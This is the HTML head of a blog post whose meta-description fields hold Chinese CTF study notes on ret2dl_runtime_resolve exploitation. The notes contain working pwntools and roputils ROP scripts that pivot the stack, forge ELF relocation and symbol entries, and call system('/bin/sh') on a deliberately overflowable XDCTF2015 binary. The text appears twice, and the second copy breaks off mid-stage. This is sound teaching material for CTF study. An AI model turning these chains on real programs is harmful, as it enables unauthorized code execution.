<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.17.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Pwnit 5  -  My way, though far away</title>
<meta name="description" content="  pwn学习资料，来自ctf-wiki。高级 ROP ret2dl_dl_runtime_resolve过程在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用_dl_runtime_resolve(link_map_obj, reloc_index)，这里以 32 位为例（64 位类似），具体的过程如下。  根据 reloc_index 计算相应的重定位表项：**Elf32_Rel *reloc = JMPREL + reloc_index **reloc_index 就是plt中表项的第二条指令，会将一个index压栈。而如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un;} Elf32_Dyn;其中，d_tag 的取值决定了该如何解释 d_un。而公式中的JMPREL 是.rel.plt的TAG。根据下面这个表格可知，d_ptr包含了plt表的首地址。            名称      数值      d_un      可执行      共享 目标      说明                  DT_JMPREL      23      d_ptr      可选      可选      该类型的条目的 d_ptr 成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。      所以Elf32_Rel *reloc这个对象就指向.rel.plt的表项。这个结构体如下所示。typedef struct {    Elf32_Addr        r_offset;    Elf32_Word       r_info;} Elf32_Rel;            成员      说明                  r_offset      此成员给出了需要重定位的位置。对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的虚拟地址，一般而言，也就是说我们所说的 GOT 表的地址。              r_info      此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。      当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置。#define ELF32_R_SYM(i)    ((i)&gt;&gt;8)#define ELF32_R_TYPE(i)   ((unsigned char)(i))#define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))  根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)»8比如我选取write函数，write函数的r_offset=0x0804a01c，也就是got表地址，即.got.plt节，而r_info=0x707。所以这时候索引就是7。  继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)»8)]这一步就是查找.dynsym这个节就行了，因为索引已经给出了。  判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )然后通过ELF32_R_TYPE(0x707)判断是不是 7，对应R_386_JUMP_SLOT。通过.dynsym节，根据索引和项大小，得到字符串在.dynstr节的偏移量，然后得到符号write。TODO:  if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)          if (sym-&gt;st_other) &amp; 3 == 0 )      判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。        得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。          uint16_t ndx = VERSYM[(reloc-&gt;r_info) » 8]      r_found_version *version = &amp;l-&gt;l_version[ndx]        根据 name 来寻找相应函数在库中的地址。          name = STRTAB + sym-&gt;st_name      延迟绑定其他没什么好说的，讲了好几遍了，就上个图，记住got表首部的几个值，其中GOT[0]，指向的是.dynamic 节的首地址。而 GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。最后 GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数指针。而PLT[0]就是将GOT[1]压栈，PLT[1]就是跳转到GOT[2]的地址。ret2_dl_runtime_resolve那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下  控制程序执行 dl_resolve 函数          给定 Link_map 以及 index 两个参数。      当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。        控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。  伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。  伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。此外，这个攻击成功的很必要的条件dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。dl_resolve 函数最后的解析根本上依赖于所给定的字符串。注意：  符号版本信息          最好使得 ndx = VERSYM[(reloc-&gt;r_info) » 8] 的值为 0，以便于防止找不到的情况。        重定位表项          r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。      实现ret2dl源代码：#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln(){    char buf[100];    setbuf(stdin, buf);    read(0, buf, 256);}int main(){    char buf[100] = &quot;Welcome to XDCTF2015~!\n&quot;;    setbuf(stdout, buf);    write(1, buf, strlen(buf));    vuln();    return 0;}编译成32位，只开个NX就行。很明显就是个栈溢出，我们首先找到ret的offset，用gef的pattern就能发现是112了。其实常规做法也能做，脚本如下：rop = ROP(elf)rop.call(&#39;write&#39;, [1, elf.got[&#39;write&#39;], 4])rop.raw(elf.sym[&#39;_start&#39;])s.recv()s.send(flat([cyclic(112), rop.chain()]))libc.address = u32(s.recv(4)) - libc.symbols[&#39;write&#39;]log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc.address))s.recv()one_shot = libc.address + 0x3e7d6s.send(flat([cyclic(112), one_shot, &#39;\x00&#39; * 0x38]))s.interactive()就是泄露got表，然后第二次one_gadget大法就行了。。STAGE 1但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步：  将栈迁移到 bss 段。  控制 write 函数输出相应字符串。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;rop.write(1, base_stage + 80, len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 2在这一阶段，我们将会利用 dlresolve 相关的知识来控制程序执行 write 函数。这里我们主要是利用 plt[0] 中的相关指令，即 GOT[2] push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rop.raw(plt0)rop.raw(write_index)## fake ret addr of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 3这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。脚本如下：rop = ROP(elf)# 自定义stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr# push offset in PLTwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;)# ELF_REL：r_offset and r_info of write@pltr_offset = u32(rel_plt.data()[write_index:write_index + 4])r_info = u32(rel_plt.data()[write_index + 4:write_index + 8])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt.header.sh_addr# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(r_offset)rop.raw(r_info)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()最后结果如下，这次我们在 bss 段伪造了一个假的 write 的重定位项，仍然输出了对应的字符串。STAGE 4stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607»8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。通过伪造fake .dynsym和fake .rel.pltrop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# fake symfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# dynsym index of symindex_dynsym = (fake_sym_addr - dynsym) / 0x10# fake item(write) of .dynsymfake_write_sym = flat([0x4c, 0, 0, 0x12])# fake write relocationr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# fake dynsym (align to 0x10)rop.raw(fake_write_sym)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 5这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;write\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()STAGE 6这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(base_stage + 80)rop.raw(&#39;aaaa&#39;)rop.raw(&#39;bbbb&#39;)# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;system\x00\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()漏洞利用方式  控制eip为PLT[0]的地址，只需传递一个index_arg参数  控制index_arg的大小，使reloc的位置落在可控地址内  伪造reloc的内容，使sym落在可控地址内  伪造sym的内容，使name落在可控地址内  伪造name为任意库函数，如system工具攻击#!/usr/bin/env python# -*- coding: utf-8 -*-__author__ = &#39;zjgcjy&#39;import osimport syssys.path.append(&#39;/home/zjgcjy/roputils&#39;)from roputils import *from pwn import process, gdb, context#from LibcSearcher import *#context.arch = elf.archcontext.terminal = [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]s = process(&#39;./main&#39;)context.log_level = &#39;debug&#39;s.recv()rop = ROP(&#39;./main&#39;)offset = 112bss_base = rop.section(&#39;.bss&#39;)buf = rop.fill(offset)buf += rop.call(&#39;read&#39;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)s.send(buf)buf = rop.string(&#39;/bin/sh&#39;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &#39;system&#39;)buf += rop.fill(100, buf)s.send(buf)s.interactive()">


  <meta name="author" content="zjgcjy">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="My way, though far away">
<meta property="og:title" content="Pwnit 5">
<meta property="og:url" content="http://localhost:4000/posts/2019-03/Pwnit-5.html">


  <meta property="og:description" content="  pwn学习资料，来自ctf-wiki。高级 ROP ret2dl_dl_runtime_resolve过程在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用_dl_runtime_resolve(link_map_obj, reloc_index)，这里以 32 位为例（64 位类似），具体的过程如下。  根据 reloc_index 计算相应的重定位表项：**Elf32_Rel *reloc = JMPREL + reloc_index **reloc_index 就是plt中表项的第二条指令，会将一个index压栈。而如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un;} Elf32_Dyn;其中，d_tag 的取值决定了该如何解释 d_un。而公式中的JMPREL 是.rel.plt的TAG。根据下面这个表格可知，d_ptr包含了plt表的首地址。            名称      数值      d_un      可执行      共享 目标      说明                  DT_JMPREL      23      d_ptr      可选      可选      该类型的条目的 d_ptr 成员包含了过程链接表的地址，并且索引时应该会把该地址强制转换为对应的重定位表项类型的指针。把重定位表项分开有利于让动态链接器在进程初始化时忽略它们（开启了延迟绑定）。如果存在此成员，相关的 DT_PLTRELSZ 和 DT_PLTREL 必须也存在。      所以Elf32_Rel *reloc这个对象就指向.rel.plt的表项。这个结构体如下所示。typedef struct {    Elf32_Addr        r_offset;    Elf32_Word       r_info;} Elf32_Rel;            成员      说明                  r_offset      此成员给出了需要重定位的位置。对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的虚拟地址，一般而言，也就是说我们所说的 GOT 表的地址。              r_info      此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。 例如一个调用指令的重定位项将包含被调用函数的符号表索引。如果索引是 STN_UNDEF，那么重定位使用 0 作为 “符号值”。此外，重定位类型是和处理器相关的。      当程序代码引用一个重定位项的重定位类型或者符号表索引时，这个索引是对表项的 r_info 成员应用 ELF32_R_TYPE 或者 ELF32_R_SYM 的结果。 也就是说 r_info 的高三个字节对应的值表示这个动态符号在. dynsym 符号表中的位置。#define ELF32_R_SYM(i)    ((i)&gt;&gt;8)#define ELF32_R_TYPE(i)   ((unsigned char)(i))#define ELF32_R_INFO(s,t) (((s)&lt;&lt;8)+(unsigned char)(t))  根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)»8比如我选取write函数，write函数的r_offset=0x0804a01c，也就是got表地址，即.got.plt节，而r_info=0x707。所以这时候索引就是7。  继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)»8)]这一步就是查找.dynsym这个节就行了，因为索引已经给出了。  判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )然后通过ELF32_R_TYPE(0x707)判断是不是 7，对应R_386_JUMP_SLOT。通过.dynsym节，根据索引和项大小，得到字符串在.dynstr节的偏移量，然后得到符号write。TODO:  if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)          if (sym-&gt;st_other) &amp; 3 == 0 )      判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。        得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。          uint16_t ndx = VERSYM[(reloc-&gt;r_info) » 8]      r_found_version *version = &amp;l-&gt;l_version[ndx]        根据 name 来寻找相应函数在库中的地址。          name = STRTAB + sym-&gt;st_name      延迟绑定其他没什么好说的，讲了好几遍了，就上个图，记住got表首部的几个值，其中GOT[0]，指向的是.dynamic 节的首地址。而 GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。最后 GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数指针。而PLT[0]就是将GOT[1]压栈，PLT[1]就是跳转到GOT[2]的地址。ret2_dl_runtime_resolve那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下  控制程序执行 dl_resolve 函数          给定 Link_map 以及 index 两个参数。      当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。        控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。  伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。  伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。此外，这个攻击成功的很必要的条件dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。dl_resolve 函数最后的解析根本上依赖于所给定的字符串。注意：  符号版本信息          最好使得 ndx = VERSYM[(reloc-&gt;r_info) » 8] 的值为 0，以便于防止找不到的情况。        重定位表项          r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。      实现ret2dl源代码：#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void vuln(){    char buf[100];    setbuf(stdin, buf);    read(0, buf, 256);}int main(){    char buf[100] = &quot;Welcome to XDCTF2015~!\n&quot;;    setbuf(stdout, buf);    write(1, buf, strlen(buf));    vuln();    return 0;}编译成32位，只开个NX就行。很明显就是个栈溢出，我们首先找到ret的offset，用gef的pattern就能发现是112了。其实常规做法也能做，脚本如下：rop = ROP(elf)rop.call(&#39;write&#39;, [1, elf.got[&#39;write&#39;], 4])rop.raw(elf.sym[&#39;_start&#39;])s.recv()s.send(flat([cyclic(112), rop.chain()]))libc.address = u32(s.recv(4)) - libc.symbols[&#39;write&#39;]log.success(&quot;libc_base -&gt; {:#x}&quot;.format(libc.address))s.recv()one_shot = libc.address + 0x3e7d6s.send(flat([cyclic(112), one_shot, &#39;\x00&#39; * 0x38]))s.interactive()就是泄露got表，然后第二次one_gadget大法就行了。。STAGE 1但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到 bss 段来控制 write 函数。即主要分为两步：  将栈迁移到 bss 段。  控制 write 函数输出相应字符串。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;rop.write(1, base_stage + 80, len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 2在这一阶段，我们将会利用 dlresolve 相关的知识来控制程序执行 write 函数。这里我们主要是利用 plt[0] 中的相关指令，即 GOT[2] push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。rop = ROP(elf)stack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting, set esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rop.raw(plt0)rop.raw(write_index)## fake ret addr of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 3这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。脚本如下：rop = ROP(elf)# 自定义stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr# push offset in PLTwrite_index = ((elf.plt[&#39;write&#39;] - plt0) / 16 - 1) * 8rel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;)# ELF_REL：r_offset and r_info of write@pltr_offset = u32(rel_plt.data()[write_index:write_index + 4])r_info = u32(rel_plt.data()[write_index + 4:write_index + 8])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt.header.sh_addr# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(r_offset)rop.raw(r_info)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()最后结果如下，这次我们在 bss 段伪造了一个假的 write 的重定位项，仍然输出了对应的字符串。STAGE 4stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607»8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。通过伪造fake .dynsym和fake .rel.pltrop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# fake symfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# dynsym index of symindex_dynsym = (fake_sym_addr - dynsym) / 0x10# fake item(write) of .dynsymfake_write_sym = flat([0x4c, 0, 0, 0x12])# fake write relocationr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# fake reloc = base_stage + 24index_offset = base_stage + 24 - rel_plt# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# fake reloc (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# fake dynsym (align to 0x10)rop.raw(fake_write_sym)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))s.send(rop.chain())#s.recv()s.interactive()STAGE 5这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。rop = ROP(elf)# stack sizestack_size = 0x800base_stage = elf.bss() + stack_sizerop.raw(cyclic(112))rop.read(0, base_stage, 100)# stack pivoting，esp = base_stagerop.migrate(base_stage)s.recv()s.send(rop.chain())rop = ROP(elf)sh = &quot;/bin/sh\x00&quot;plt0 = elf.get_section_by_name(&#39;.plt&#39;).header.sh_addrrel_plt = elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addrdynsym = elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addrdynstr = elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr# 1. fake index to fake .rel.pltindex_offset = base_stage + 24 - rel_plt# 3. fake .dynsymfake_sym_addr = base_stage + 32# size of item(Elf32_Symbol) of dynsym is 0x10align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  fake_sym_addr = fake_sym_addr + align# 4. fake index to fake .dynstrindex_dynsym = (fake_sym_addr - dynsym) / 0x10# 2. fake r_info in .rel.plt to fake .dynsymr_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([elf.got[&#39;write&#39;], r_info])# 5. fake st_name # 0x10 is the offset of fake_write_symst_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])# args in dl_resloverop.raw(plt0)rop.raw(index_offset)# fake ret of writerop.raw(0xdeadbeef)# write(1, addr, len)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))# 1. fake .rel.plt (offset 4*6=24)rop.raw(fake_write_reloc)# paddingrop.raw(&#39;a&#39; * align)# 2. fake .dynsym (align to 0x10)rop.raw(fake_write_sym)# 3. fake .dynstrrop.raw(&#39;write\x00&#39;)rop.raw(rop.generatePadding(0, 80 - len(rop.chain())))rop.raw(sh)rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))print rop.dump()s.send(rop.chain())#s.recv()s.interactive()STAGE 